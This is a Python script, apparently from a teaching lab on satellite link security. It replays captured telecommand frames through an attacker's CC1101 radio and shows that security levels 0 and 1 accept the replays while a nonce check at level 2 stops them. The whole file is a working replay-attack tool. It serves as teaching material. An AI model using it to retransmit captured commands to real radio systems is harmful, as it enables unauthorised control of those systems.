"""
Replay attack.

Reads a JSONL capture (from capture.py), picks one or more frames, and
retransmits them through the attacker's Pico+CC1101. Works without any
key material — the satellite at security level 0 will accept any
syntactically valid frame; at level 1 the HMAC tag is unchanged across
replays so the satellite still accepts; at level 2+ the strict-monotonic
nonce check breaks this and the lesson moves on.

Usage:
    python -m groundstation.attacker.replay --port /dev/ttyACM1 \
        --in captures/session.jsonl --apid 0x083    # set-mode TC, e.g.
    python -m groundstation.attacker.replay --port /dev/ttyACM1 \
        --in captures/session.jsonl --index 17      # the 17th frame
"""

import argparse
import json
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, ROOT)

def load_capture(path):
    with open(path) as fp:
        return [json.loads(line) for line in fp if line.strip()]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port")
    ap.add_argument("--sim",  action="store_true")
    ap.add_argument("--node-id", default="ATKR")
    ap.add_argument("--in", dest="infile", required=True)
    ap.add_argument("--apid", type=lambda v: int(v, 0), default=None,
                    help="if set, replay the first matching APID")
    ap.add_argument("--index", type=int, default=None,
                    help="replay the N-th frame in the capture (0-based)")
    ap.add_argument("--count", type=int, default=1,
                    help="how many times to retransmit")
    ap.add_argument("--delay", type=float, default=0.5)
    ap.add_argument("--freq", type=int, default=433_920_000)
    ap.add_argument("--sync", default="d391")
    ap.add_argument("--bitrate", type=int, default=9600)
    args = ap.parse_args()

    cap = load_capture(args.infile)
    if not cap:
        sys.exit("capture is empty")

    if args.index is not None:
        chosen = [cap[args.index]]
    elif args.apid is not None:
        chosen = [r for r in cap
                  if r["decoded"].get("apid") == args.apid][:1]
    else:
        chosen = [cap[-1]]
    if not chosen:
        sys.exit("nothing matched")

    if not args.sim and not args.port:
        ap.error("--port is required unless --sim is given")
    from sim.sim_link import make_link
    link = make_link(args, default_node_id=args.node_id)
    time.sleep(0.5)
    link.send_cfg(args.freq, int(args.sync, 16), args.bitrate)

    for rec in chosen:
        frame = bytes.fromhex(rec["frame"])
        for i in range(args.count):
            print("TX [%d/%d] apid=%s len=%d %s" % (
                i + 1, args.count,
                rec["decoded"].get("apid_name", "?"),
                len(frame), frame.hex()))
            link.send_tx(frame)
            time.sleep(args.delay)

    time.sleep(1.0)


if __name__ == "__main__":
    main()
